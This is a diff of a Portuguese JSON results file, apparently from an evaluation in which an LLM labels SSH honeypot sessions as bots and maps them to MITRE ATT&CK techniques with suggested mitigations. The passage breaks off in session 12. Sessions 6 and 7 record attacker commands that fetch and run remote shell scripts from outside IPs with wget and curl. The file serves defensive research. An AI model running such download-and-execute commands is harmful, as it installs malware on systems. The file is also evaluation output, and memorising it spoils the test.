@@ -2,13 +2,24 @@
   {
     "ordem": 1,
     "session_id": "bot_01_9a1c3012f411",
+    "pausas_segundos": [
+      1
+    ],
+    "comandos_com_tempo": [
+      "[1] uname -s -v -n -r -m (+1s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] uname -s -v -n -r -m"
+    ],
     "ground_truth": "BOT_AUTOMATIZADO",
     "classificacao_prompt_neutro": "BOT_AUTOMATIZADO",
-    "tempo_segundos_api": 1.23,
+    "classificacao_prompt_neutro_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_prompt_neutro_sem_tempos": "BOT_AUTOMATIZADO",
+    "tempo_segundos_api": 1.39,
     "resposta_crua_prompt_neutro": {
       "actor_type": "BOT_AUTOMATIZADO",
       "severity_level": "BAIXO",
-      "summary": "O IP de origem executou um comando único para reconhecimento básico do sistema operacional logo após a autenticação, comportamento típico de scripts automatizados de varredura ou sondagem inicial.",
+      "summary": "O endereço IP de origem executou apenas um comando básico de fingerprinting do sistema operacional (uname) logo após o login, comportamento típico de scripts automatizados de varredura ou reconhecimento inicial.",
       "mitre_attack": [
         {
           "tactic": "Discovery",
@@ -26,7 +37,33 @@
       "session_id": "bot_01_9a1c3012f411",
       "src_ip": "185.220.101.42",
       "etapa": "API_gemini-3.5-flash-lite_PROMPT_NEUTRO",
-      "tempo_segundos": 1.23,
+      "tempo_segundos": 1.39,
+      "comandos": [
+        "uname -s -v -n -r -m"
+      ]
+    },
+    "resposta_crua_prompt_neutro_com_tempos": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "BAIXO",
+      "summary": "Execução isolada de comando de enumeração básica de sistema (uname) logo após a autenticação, típico de comportamento de script automatizado ou varredura de reconhecimento inicial.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "uname -s -v -n -r -m"
+        }
+      ],
+      "mitigation_commands": [
+        "passwd -l root",
+        "sed -i 's/^PermitRootLogin.*/PermitRootLogin no/g' /etc/ssh/sshd_config",
+        "systemctl restart sshd",
+        "iptables -A INPUT -s 185.220.101.42 -j DROP"
+      ],
+      "session_id": "bot_01_9a1c3012f411",
+      "src_ip": "185.220.101.42",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.32,
       "comandos": [
         "uname -s -v -n -r -m"
       ]
@@ -35,13 +72,24 @@
   {
     "ordem": 2,
     "session_id": "bot_02_1fe070084516",
+    "pausas_segundos": [
+      0
+    ],
+    "comandos_com_tempo": [
+      "[1] uname -s -v -n -r -m (+0s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] uname -s -v -n -r -m"
+    ],
     "ground_truth": "BOT_AUTOMATIZADO",
     "classificacao_prompt_neutro": "BOT_AUTOMATIZADO",
-    "tempo_segundos_api": 1.25,
+    "classificacao_prompt_neutro_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_prompt_neutro_sem_tempos": "BOT_AUTOMATIZADO",
+    "tempo_segundos_api": 1.19,
     "resposta_crua_prompt_neutro": {
       "actor_type": "BOT_AUTOMATIZADO",
       "severity_level": "BAIXO",
-      "summary": "Sessão iniciada por bot ou script automatizado realizando reconhecimento básico do sistema operacional através do comando uname logo após a autenticação.",
+      "summary": "O invasor realizou apenas uma verificação inicial do sistema (coleta de informações do kernel e arquitetura) logo após a autenticação, comportamento típico de scripts de reconhecimento automatizados ou botnets.",
       "mitre_attack": [
         {
           "tactic": "Discovery",
@@ -53,14 +101,37 @@
       "mitigation_commands": [
         "passwd -l root",
         "sed -i 's/^PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config",
-        "systemctl restart sshd",
-        "ufw allow from <SEU_IP_ADMIN> to any port 22",
-        "ufw deny 22"
+        "systemctl restart sshd"
       ],
       "session_id": "bot_02_1fe070084516",
       "src_ip": "77.239.124.147",
       "etapa": "API_gemini-3.5-flash-lite_PROMPT_NEUTRO",
-      "tempo_segundos": 1.25,
+      "tempo_segundos": 1.19,
+      "comandos": [
+        "uname -s -v -n -r -m"
+      ]
+    },
+    "resposta_crua_prompt_neutro_com_tempos": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "BAIXO",
+      "summary": "Execução isolada de comando para reconhecimento básico do sistema operacional (uname) logo após a autenticação, comportamento típico de scripts automatizados de varredura.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "uname -s -v -n -r -m"
+        }
+      ],
+      "mitigation_commands": [
+        "passwd -l root",
+        "sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config",
+        "systemctl restart sshd"
+      ],
+      "session_id": "bot_02_1fe070084516",
+      "src_ip": "77.239.124.147",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.27,
       "comandos": [
         "uname -s -v -n -r -m"
       ]
@@ -69,13 +140,24 @@
   {
     "ordem": 3,
     "session_id": "bot_03_4b8e2109c312",
+    "pausas_segundos": [
+      0
+    ],
+    "comandos_com_tempo": [
+      "[1] uname -s -v -n -r -m (+0s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] uname -s -v -n -r -m"
+    ],
     "ground_truth": "BOT_AUTOMATIZADO",
     "classificacao_prompt_neutro": "BOT_AUTOMATIZADO",
-    "tempo_segundos_api": 3.1,
+    "classificacao_prompt_neutro_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_prompt_neutro_sem_tempos": "BOT_AUTOMATIZADO",
+    "tempo_segundos_api": 1.14,
     "resposta_crua_prompt_neutro": {
       "actor_type": "BOT_AUTOMATIZADO",
       "severity_level": "BAIXO",
-      "summary": "Execução única de comando de reconhecimento básico (uname) típica de scripts automatizados de varredura ou sondagem inicial.",
+      "summary": "Execução única de comando de reconhecimento básico para identificação do sistema operacional (uname), típica de scripts automatizados de varredura ou reconhecimento inicial.",
       "mitre_attack": [
         {
           "tactic": "Discovery",
@@ -91,7 +173,32 @@
       "session_id": "bot_03_4b8e2109c312",
       "src_ip": "109.160.32.178",
       "etapa": "API_gemini-3.5-flash-lite_PROMPT_NEUTRO",
-      "tempo_segundos": 3.1,
+      "tempo_segundos": 1.14,
+      "comandos": [
+        "uname -s -v -n -r -m"
+      ]
+    },
+    "resposta_crua_prompt_neutro_com_tempos": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "BAIXO",
+      "summary": "Execução de comando único de reconhecimento básico (uname) logo após a autenticação, indicando comportamento típico de script automatizado ou scanner de sondagem.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "uname -s -v -n -r -m"
+        }
+      ],
+      "mitigation_commands": [
+        "passwd -l gpadmin",
+        "fail2ban-client set sshd banip 109.160.32.178",
+        "sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config"
+      ],
+      "session_id": "bot_03_4b8e2109c312",
+      "src_ip": "109.160.32.178",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.27,
       "comandos": [
         "uname -s -v -n -r -m"
       ]
@@ -100,13 +207,50 @@
   {
     "ordem": 4,
     "session_id": "bot_04_7c2d9018a104",
+    "pausas_segundos": [
+      0
+    ],
+    "comandos_com_tempo": [
+      "[1] echo xsec (+0s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] echo xsec"
+    ],
     "ground_truth": "BOT_AUTOMATIZADO",
     "classificacao_prompt_neutro": "BOT_AUTOMATIZADO",
-    "tempo_segundos_api": 1.26,
+    "classificacao_prompt_neutro_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_prompt_neutro_sem_tempos": "BOT_AUTOMATIZADO",
+    "tempo_segundos_api": 1.46,
     "resposta_crua_prompt_neutro": {
       "actor_type": "BOT_AUTOMATIZADO",
       "severity_level": "BAIXO",
-      "summary": "O invasor realizou um comando simples echo para teste de conectividade ou verificação de resposta do terminal após o login bem-sucedido, típico de varreduras automatizadas e scripts de teste.",
+      "summary": "O invasor realizou um comando simples echo para teste de conectividade ou verificação de resposta do terminal após o login automatizado.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "echo xsec"
+        }
+      ],
+      "mitigation_commands": [
+        "passwd -l root",
+        "sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config",
+        "systemctl restart sshd",
+        "iptables -A INPUT -s 27.102.116.43 -j DROP"
+      ],
+      "session_id": "bot_04_7c2d9018a104",
+      "src_ip": "27.102.116.43",
+      "etapa": "API_gemini-3.5-flash-lite_PROMPT_NEUTRO",
+      "tempo_segundos": 1.46,
+      "comandos": [
+        "echo xsec"
+      ]
+    },
+    "resposta_crua_prompt_neutro_com_tempos": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "BAIXO",
+      "summary": "Sessão iniciada por um bot automatizado realizando uma sondagem básica ou verificação de conectividade utilizando o comando 'echo xsec'.",
       "mitre_attack": [
         {
           "tactic": "Discovery",
@@ -116,14 +260,15 @@
         }
       ],
       "mitigation_commands": [
+        "iptables -A INPUT -s 27.102.116.43 -j DROP",
         "passwd -l root",
         "sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config",
         "systemctl restart sshd"
       ],
       "session_id": "bot_04_7c2d9018a104",
       "src_ip": "27.102.116.43",
-      "etapa": "API_gemini-3.5-flash-lite_PROMPT_NEUTRO",
-      "tempo_segundos": 1.26,
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.24,
       "comandos": [
         "echo xsec"
       ]
@@ -132,32 +277,67 @@
   {
     "ordem": 5,
     "session_id": "bot_05_3e7f1042b819",
+    "pausas_segundos": [
+      1
+    ],
+    "comandos_com_tempo": [
+      "[1] echo xsec (+1s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] echo xsec"
+    ],
     "ground_truth": "BOT_AUTOMATIZADO",
     "classificacao_prompt_neutro": "BOT_AUTOMATIZADO",
-    "tempo_segundos_api": 1.47,
+    "classificacao_prompt_neutro_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_prompt_neutro_sem_tempos": "BOT_AUTOMATIZADO",
+    "tempo_segundos_api": 1.37,
     "resposta_crua_prompt_neutro": {
       "actor_type": "BOT_AUTOMATIZADO",
       "severity_level": "BAIXO",
-      "summary": "O invasor realizou uma conexão SSH e executou um comando simples de eco ('echo xsec'), indicando uma varredura automatizada básica, teste de conectividade ou verificação de honeypot.",
+      "summary": "O invasor realizou uma tentativa de eco simples para testar a conectividade ou a resposta do shell após o acesso inicial, comportamento típico de scripts de varredura ou sondagem.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "echo xsec"
+        }
+      ],
+      "mitigation_commands": [
+        "passwd",
+        "fail2ban-client",
+        "ufw deny from 154.18.197.29 to any port 22"
+      ],
+      "session_id": "bot_05_3e7f1042b819",
+      "src_ip": "154.18.197.29",
+      "etapa": "API_gemini-3.5-flash-lite_PROMPT_NEUTRO",
+      "tempo_segundos": 1.37,
+      "comandos": [
+        "echo xsec"
+      ]
+    },
+    "resposta_crua_prompt_neutro_com_tempos": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "BAIXO",
+      "summary": "Tentativa de login e execução de comando simples ('echo xsec'), típico de varreduras automatizadas, testes de conexão ou sondagem inicial de botnets.",
       "mitre_attack": [
         {
           "tactic": "Discovery",
           "technique_id": "T1033",
           "technique_name": "System Owner/User Discovery",
-          "evidence": "echo xsec"
+          "evidence": "Execução de comando trivial de eco ('echo xsec') logo após a autenticação para validar a sessão."
         }
       ],
       "mitigation_commands": [
-        "fail2ban-client set sshd banip 154.18.197.29",
-        "iptables -A INPUT -s 154.18.197.29 -j DROP",
+        "passwd -l admin",
+        "ufw deny from 154.18.197.29 to any port 22",
         "sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config",
-        "sed -i 's/#PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config",
         "systemctl restart sshd"
       ],
       "session_id": "bot_05_3e7f1042b819",
       "src_ip": "154.18.197.29",
-      "etapa": "API_gemini-3.5-flash-lite_PROMPT_NEUTRO",
-      "tempo_segundos": 1.47,
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.23,
       "comandos": [
         "echo xsec"
       ]
@@ -166,13 +346,33 @@
   {
     "ordem": 6,
     "session_id": "bot_06_a84f92c10e3b",
+    "pausas_segundos": [
+      0,
+      0,
+      1,
+      0
+    ],
+    "comandos_com_tempo": [
+      "[1] cd /tmp (+0s)",
+      "[2] wget http://45.142.214.18/bot.sh (+0s)",
+      "[3] chmod +x bot.sh (+1s)",
+      "[4] ./bot.sh (+0s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] cd /tmp",
+      "[2] wget http://45.142.214.18/bot.sh",
+      "[3] chmod +x bot.sh",
+      "[4] ./bot.sh"
+    ],
     "ground_truth": "BOT_AUTOMATIZADO",
     "classificacao_prompt_neutro": "BOT_AUTOMATIZADO",
-    "tempo_segundos_api": 1.37,
+    "classificacao_prompt_neutro_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_prompt_neutro_sem_tempos": "BOT_AUTOMATIZADO",
+    "tempo_segundos_api": 1.6,
     "resposta_crua_prompt_neutro": {
       "actor_type": "BOT_AUTOMATIZADO",
       "severity_level": "ALTO",
-      "summary": "O invasor acessou o diretório temporário, baixou um script malicioso de um servidor externo desconhecido, concedeu permissões de execução e executou o script, comportamento típico de infecção automatizada por malware ou botnet.",
+      "summary": "O invasor acessou o diretório temporário, baixou um script de bot malicioso de um IP externo, concedeu permissão de execução e executou o script, caracterizando uma infecção automatizada por malware.",
       "mitre_attack": [
         {
           "tactic": "Execution",
@@ -188,14 +388,50 @@
         }
       ],
       "mitigation_commands": [
-        "iptables -A INPUT -s 45.142.214.18 -j DROP",
+        "killall bot.sh",
         "rm -f /tmp/bot.sh",
-        "pkill -f bot.sh"
+        "iptables -A INPUT -s 45.142.214.18 -j DROP",
+        "passwd -l user"
       ],
       "session_id": "bot_06_a84f92c10e3b",
       "src_ip": "45.142.214.18",
       "etapa": "API_gemini-3.5-flash-lite_PROMPT_NEUTRO",
-      "tempo_segundos": 1.37,
+      "tempo_segundos": 1.6,
+      "comandos": [
+        "cd /tmp",
+        "wget http://45.142.214.18/bot.sh",
+        "chmod +x bot.sh",
+        "./bot.sh"
+      ]
+    },
+    "resposta_crua_prompt_neutro_com_tempos": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "ALTO",
+      "summary": "Execução rápida e automatizada de script malicioso via wget a partir de um IP de origem suspeito, típico de infecção por botnet.",
+      "mitre_attack": [
+        {
+          "tactic": "Execution",
+          "technique_id": "T1059.004",
+          "technique_name": "Command and Scripting Interpreter: Unix Shell",
+          "evidence": "wget http://45.142.214.18/bot.sh e ./bot.sh"
+        },
+        {
+          "tactic": "Ingress Tool Transfer",
+          "technique_id": "T1105",
+          "technique_name": "Ingress Tool Transfer",
+          "evidence": "wget http://45.142.214.18/bot.sh"
+        }
+      ],
+      "mitigation_commands": [
+        "pkill -f bot.sh",
+        "rm -f /tmp/bot.sh",
+        "iptables -A INPUT -s 45.142.214.18 -j DROP",
+        "passwd -l user"
+      ],
+      "session_id": "bot_06_a84f92c10e3b",
+      "src_ip": "45.142.214.18",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.3,
       "comandos": [
         "cd /tmp",
         "wget http://45.142.214.18/bot.sh",
@@ -207,13 +443,30 @@
   {
     "ordem": 7,
     "session_id": "bot_07_c72e11049b21",
+    "pausas_segundos": [
+      0,
+      1,
+      0
+    ],
+    "comandos_com_tempo": [
+      "[1] cd /tmp (+0s)",
+      "[2] curl -O http://185.220.101.42/bins.sh (+1s)",
+      "[3] sh bins.sh (+0s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] cd /tmp",
+      "[2] curl -O http://185.220.101.42/bins.sh",
+      "[3] sh bins.sh"
+    ],
     "ground_truth": "BOT_AUTOMATIZADO",
     "classificacao_prompt_neutro": "BOT_AUTOMATIZADO",
-    "tempo_segundos_api": 1.34,
+    "classificacao_prompt_neutro_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_prompt_neutro_sem_tempos": "BOT_AUTOMATIZADO",
+    "tempo_segundos_api": 1.25,
     "resposta_crua_prompt_neutro": {
       "actor_type": "BOT_AUTOMATIZADO",
       "severity_level": "ALTO",
-      "summary": "O invasor acessou o diretório temporário, baixou um script de instalação automatizada de um servidor remoto e executou-o imediatamente, comportamento típico de botnets e propagação de malware.",
+      "summary": "O invasor acessou o diretório temporário, baixou um script de instalação de binários maliciosos a partir de um servidor externo via cURL e executou-o imediatamente, comportamento típico de botnets ou worms em varreduras automatizadas.",
       "mitre_attack": [
         {
           "tactic": "Execution",
@@ -236,7 +489,40 @@
       "session_id": "bot_07_c72e11049b21",
       "src_ip": "185.220.101.42",
       "etapa": "API_gemini-3.5-flash-lite_PROMPT_NEUTRO",
-      "tempo_segundos": 1.34,
+      "tempo_segundos": 1.25,
+      "comandos": [
+        "cd /tmp",
+        "curl -O http://185.220.101.42/bins.sh",
+        "sh bins.sh"
+      ]
+    },
+    "resposta_crua_prompt_neutro_com_tempos": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "ALTO",
+      "summary": "O invasor acessou o diretório temporário, baixou um script de carga útil (payload) de um IP externo usando curl e executou imediatamente o script, indicando um comportamento típico de botnet ou propagação automatizada de malware.",
+      "mitre_attack": [
+        {
+          "tactic": "Execution",
+          "technique_id": "T1059.004",
+          "technique_name": "Command and Scripting Interpreter: Unix Shell",
+          "evidence": "sh bins.sh"
+        },
+        {
+          "tactic": "Ingress Tool Transfer",
+          "technique_id": "T1105",
+          "technique_name": "Ingress Tool Transfer",
+          "evidence": "curl -O http://185.220.101.42/bins.sh"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 185.220.101.42 -j DROP",
+        "rm -f /tmp/bins.sh",
+        "pkill -f bins.sh"
+      ],
+      "session_id": "bot_07_c72e11049b21",
+      "src_ip": "185.220.101.42",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.44,
       "comandos": [
         "cd /tmp",
         "curl -O http://185.220.101.42/bins.sh",
@@ -247,13 +533,24 @@
   {
     "ordem": 8,
     "session_id": "bot_08_5d9a8120e402",
+    "pausas_segundos": [
+      0
+    ],
+    "comandos_com_tempo": [
+      "[1] cat /proc/cpuinfo (+0s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] cat /proc/cpuinfo"
+    ],
     "ground_truth": "BOT_AUTOMATIZADO",
     "classificacao_prompt_neutro": "BOT_AUTOMATIZADO",
-    "tempo_segundos_api": 1.25,
+    "classificacao_prompt_neutro_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_prompt_neutro_sem_tempos": "BOT_AUTOMATIZADO",
+    "tempo_segundos_api": 1.54,
     "resposta_crua_prompt_neutro": {
       "actor_type": "BOT_AUTOMATIZADO",
       "severity_level": "BAIXO",
-      "summary": "Execução isolada de comando para reconhecimento básico de hardware (CPU) típica de scripts de sondagem automatizados ou malwares recém-infiltrados verificando o ambiente.",
+      "summary": "Execução rápida e automatizada de um único comando de reconhecimento básico de hardware (/proc/cpuinfo), típico de scripts de varredura inicial ou botnets sondando o sistema.",
       "mitre_attack": [
         {
           "tactic": "Discovery",
@@ -264,14 +561,40 @@
       ],
       "mitigation_commands": [
         "passwd -l root",
-        "iptables -A INPUT -s 91.240.118.172 -j DROP",
         "sed -i 's/^PermitRootLogin.*/PermitRootLogin no/g' /etc/ssh/sshd_config",
-        "systemctl restart sshd"
+        "systemctl restart sshd",
+        "ufw deny from 91.240.118.172 to any port 22"
       ],
       "session_id": "bot_08_5d9a8120e402",
       "src_ip": "91.240.118.172",
       "etapa": "API_gemini-3.5-flash-lite_PROMPT_NEUTRO",
-      "tempo_segundos": 1.25,
+      "tempo_segundos": 1.54,
+      "comandos": [
+        "cat /proc/cpuinfo"
+      ]
+    },
+    "resposta_crua_prompt_neutro_com_tempos": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "BAIXO",
+      "summary": "O invasor realizou uma execução rápida e única de comando para reconhecimento básico do sistema (leitura de /proc/cpuinfo), comportamento típico de scripts automatizados de varredura ou pós-infecção inicial.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "cat /proc/cpuinfo"
+        }
+      ],
+      "mitigation_commands": [
+        "passwd -l root",
+        "ufw deny from 91.240.118.172 to any port 22",
+        "sed -i 's/^PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config",
+        "systemctl restart sshd"
+      ],
+      "session_id": "bot_08_5d9a8120e402",
+      "src_ip": "91.240.118.172",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.22,
       "comandos": [
         "cat /proc/cpuinfo"
       ]
@@ -280,13 +603,24 @@
   {
     "ordem": 9,
     "session_id": "bot_09_8f1b4039d715",
+    "pausas_segundos": [
+      0
+    ],
+    "comandos_com_tempo": [
+      "[1] uname -a (+0s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] uname -a"
+    ],
     "ground_truth": "BOT_AUTOMATIZADO",
     "classificacao_prompt_neutro": "BOT_AUTOMATIZADO",
-    "tempo_segundos_api": 1.1,
+    "classificacao_prompt_neutro_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_prompt_neutro_sem_tempos": "BOT_AUTOMATIZADO",
+    "tempo_segundos_api": 1.21,
     "resposta_crua_prompt_neutro": {
       "actor_type": "BOT_AUTOMATIZADO",
       "severity_level": "BAIXO",
-      "summary": "O invasor realizou apenas uma verificação básica de sistema (uname -a) logo após a autenticação, comportamento típico de scripts automatizados de reconhecimento inicial.",
+      "summary": "O invasor realizou apenas uma verificação básica do sistema operativo através do comando 'uname -a' logo após a autenticação, comportamento típico de scripts automatizados de varredura ou reconhecimento inicial.",
       "mitre_attack": [
         {
           "tactic": "Discovery",
@@ -298,13 +632,38 @@
       "mitigation_commands": [
         "passwd -l root",
         "sed -i 's/^PermitRootLogin.*/PermitRootLogin no/g' /etc/ssh/sshd_config",
-        "systemctl restart sshd",
-        "fail2ban-client status"
+        "systemctl restart sshd"
       ],
       "session_id": "bot_09_8f1b4039d715",
       "src_ip": "193.32.162.159",
       "etapa": "API_gemini-3.5-flash-lite_PROMPT_NEUTRO",
-      "tempo_segundos": 1.1,
+      "tempo_segundos": 1.21,
+      "comandos": [
+        "uname -a"
+      ]
+    },
+    "resposta_crua_prompt_neutro_com_tempos": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "BAIXO",
+      "summary": "Sessão iniciada por um bot automatizado que executou apenas um comando básico de reconhecimento (uname -a) logo após a autenticação.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "uname -a"
+        }
+      ],
+      "mitigation_commands": [
+        "passwd -l root",
+        "sed -i 's/^PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config",
+        "systemctl restart sshd",
+        "fail2ban-client set sshd banip 193.32.162.159"
+      ],
+      "session_id": "bot_09_8f1b4039d715",
+      "src_ip": "193.32.162.159",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.06,
       "comandos": [
         "uname -a"
       ]
@@ -313,13 +672,24 @@
   {
     "ordem": 10,
     "session_id": "bot_10_2a6c7051f908",
+    "pausas_segundos": [
+      0
+    ],
+    "comandos_com_tempo": [
+      "[1] uname -s -v -n -r -m (+0s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] uname -s -v -n -r -m"
+    ],
     "ground_truth": "BOT_AUTOMATIZADO",
     "classificacao_prompt_neutro": "BOT_AUTOMATIZADO",
-    "tempo_segundos_api": 1.25,
+    "classificacao_prompt_neutro_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_prompt_neutro_sem_tempos": "BOT_AUTOMATIZADO",
+    "tempo_segundos_api": 1.93,
     "resposta_crua_prompt_neutro": {
       "actor_type": "BOT_AUTOMATIZADO",
       "severity_level": "BAIXO",
-      "summary": "O IP de origem executou um comando único de enumeração de sistema ('uname') logo após a autenticação, comportamento típico de scripts automatizados de varredura ou reconhecimento inicial de botnets.",
+      "summary": "O invasor executou um único comando padrão para coletar informações básicas do sistema (uname), comportamento típico de scripts de varredura ou reconhecimento automatizado de botnets.",
       "mitre_attack": [
         {
           "tactic": "Discovery",
@@ -329,15 +699,42 @@
         }
       ],
       "mitigation_commands": [
-        "iptables -A INPUT -s 89.248.165.58 -j DROP",
         "passwd -l admin",
-        "sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config",
-        "systemctl restart sshd"
+        "fail2ban-client set sshd banip 89.248.165.58",
+        "sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config",
+        "sed -i 's/#PasswordAuthentication yes/PasswordAuthentication no/g' /etc/ssh/sshd_config"
       ],
       "session_id": "bot_10_2a6c7051f908",
       "src_ip": "89.248.165.58",
       "etapa": "API_gemini-3.5-flash-lite_PROMPT_NEUTRO",
-      "tempo_segundos": 1.25,
+      "tempo_segundos": 1.93,
+      "comandos": [
+        "uname -s -v -n -r -m"
+      ]
+    },
+    "resposta_crua_prompt_neutro_com_tempos": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "BAIXO",
+      "summary": "O endereço IP executou imediatamente após a autenticação um comando padrão de enumeração de sistema (uname), comportamento típico de scripts automatizados de varredura ou reconhecimento inicial.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "uname -s -v -n -r -m"
+        }
+      ],
+      "mitigation_commands": [
+        "passwd -l admin",
+        "ufw deny from 89.248.165.58 to any port 22",
+        "sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config",
+        "sed -i 's/#PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config",
+        "systemctl restart sshd"
+      ],
+      "session_id": "bot_10_2a6c7051f908",
+      "src_ip": "89.248.165.58",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.34,
       "comandos": [
         "uname -s -v -n -r -m"
       ]
@@ -346,13 +743,24 @@
   {
     "ordem": 11,
     "session_id": "bot_11_6e3d2094a517",
+    "pausas_segundos": [
+      1
+    ],
+    "comandos_com_tempo": [
+      "[1] uname -s -v -n -r -m (+1s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] uname -s -v -n -r -m"
+    ],
     "ground_truth": "BOT_AUTOMATIZADO",
     "classificacao_prompt_neutro": "BOT_AUTOMATIZADO",
-    "tempo_segundos_api": 1.24,
+    "classificacao_prompt_neutro_com_tempos": "BOT_AUTOMATIZADO",
+    "classificacao_prompt_neutro_sem_tempos": "BOT_AUTOMATIZADO",
+    "tempo_segundos_api": 1.14,
     "resposta_crua_prompt_neutro": {
       "actor_type": "BOT_AUTOMATIZADO",
       "severity_level": "BAIXO",
-      "summary": "O invasor executou um único comando de enumeração básica do sistema (uname) logo após o acesso inicial, comportamento típico de scripts automatizados de reconhecimento e varredura.",
+      "summary": "O invasor executou apenas um comando básico de coleta de informações do sistema operacional logo após o acesso inicial, comportamento típico de scripts automatizados de fingerprinting.",
       "mitre_attack": [
         {
           "tactic": "Discovery",
@@ -363,13 +771,39 @@
       ],
       "mitigation_commands": [
         "passwd -l root",
-        "sed -i 's/^PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config",
+        "sed -i 's/^PermitRootLogin.*/PermitRootLogin no/g' /etc/ssh/sshd_config",
         "systemctl restart sshd"
       ],
       "session_id": "bot_11_6e3d2094a517",
       "src_ip": "45.155.205.233",
       "etapa": "API_gemini-3.5-flash-lite_PROMPT_NEUTRO",
-      "tempo_segundos": 1.24,
+      "tempo_segundos": 1.14,
+      "comandos": [
+        "uname -s -v -n -r -m"
+      ]
+    },
+    "resposta_crua_prompt_neutro_com_tempos": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "BAIXO",
+      "summary": "O IP de origem executou um comando padrão de reconhecimento do sistema operacional logo após a autenticação, comportamento típico de scripts automatizados de varredura ou infecção.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "uname -s -v -n -r -m"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 45.155.205.233 -j DROP",
+        "passwd -l root",
+        "sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config",
+        "systemctl restart sshd"
+      ],
+      "session_id": "bot_11_6e3d2094a517",
+      "src_ip": "45.155.205.233",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.2,
       "comandos": [
         "uname -s -v -n -r -m"
       ]
@@ -378,13 +812,49 @@
   {
     "ordem": 12,
     "session_id": "bot_12_1c8f5073b214",
+    "pausas_segundos": [
+      0
+    ],
+    "comandos_com_tempo": [
+      "[1] echo xsec (+0s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] echo xsec"
+    ],
     "ground_truth": "BOT_AUTOMATIZADO",
     "classificacao_prompt_neutro": "BOT_AUTOMATIZADO",
